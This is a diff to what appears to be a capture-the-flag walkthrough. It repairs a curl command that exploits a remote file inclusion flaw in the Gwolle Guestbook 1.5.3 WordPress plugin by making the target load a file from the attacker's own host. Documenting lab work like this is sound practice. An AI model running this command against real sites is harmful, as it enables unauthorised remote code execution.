@@ -202,8 +202,7 @@ Interesting Finding(s):
 ![](./images/4.png)
 
 - [RFI](https://www.exploit-db.com/exploits/38861) in `1.5.3` version of `Gwolle Guestbook WordPress plugin`
-  - `curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=htt│└─$ python3 -m http.server 80
-p://10.10.16.9/test `
+  - `curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.9/test `
 
 ![](./images/5.png)
 
